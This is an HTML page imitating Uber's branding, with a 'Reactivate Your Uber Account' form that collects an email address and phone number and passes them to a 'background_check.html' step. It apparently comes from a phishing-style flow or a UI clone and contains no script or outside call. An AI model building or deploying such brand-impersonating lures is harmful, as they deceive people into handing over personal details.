<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reactivate Uber Account</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white;
            font-family: Arial, sans-serif;
        }
        .top-bar {
            background-color: black;
            height: 1.5cm;
            width: 100%;
            display: flex;
            align-items: center;
            padding: 0 20px;
            box-sizing: border-box;
        }
        .top-bar h1 {
            color: white;
            font-size: 2rem;
            font-weight: 500;
            margin: 0;
        }
        .content {
            margin: 2cm 20px 0;
            font-size: 1.5rem;
            color: black;
        }
        .reactivate-form {
            margin-top: 30px;
            font-size: 1.2rem;
        }
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            font-size: 1.2rem;
            margin-bottom: 20px;
            border: 2px solid black;
            border-radius: 5px;
        }
        input:focus {
            outline: none;
            border-color: black;
        }
        .submit-btn {
            background-color: black;
            color: white;
            padding: 10px 20px;
            font-size: 1.2rem;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #555;
        }
        .footer {
            margin-top: 50px;
            padding: 20px;
            background-color: #f2f2f2;
            color: #808080;
            text-align: left;
            font-size: 1rem;
            width: 100%;
            position: relative;
        }
    </style>
</head>
<body>
    <div class="top-bar">
        <h1>Uber</h1>
    </div>
    <div class="content">
        <h2>Reactivate Your Uber Account</h2>
        <p>Please provide the required information to start the reactivation process.</p>
        <form class="reactivate-form" action="background_check.html" method="GET">
            <label for="email">Email Address:</label>
            <input type="email" id="email" name="email" placeholder="Enter your email" required>

            <label for="phone">Phone Number:</label>
            <input type="text" id="phone" name="phone" placeholder="Enter your phone number" required>

            <button type="submit" class="submit-btn">Submit</button>
        </form>
    </div>
    <div class="footer">
        By proceeding, you consent to receiving calls, WhatsApp or SMS/RCS messages, including by automated means, from Uber and its affiliates to the number provided.
    </div>
</body>
</html>
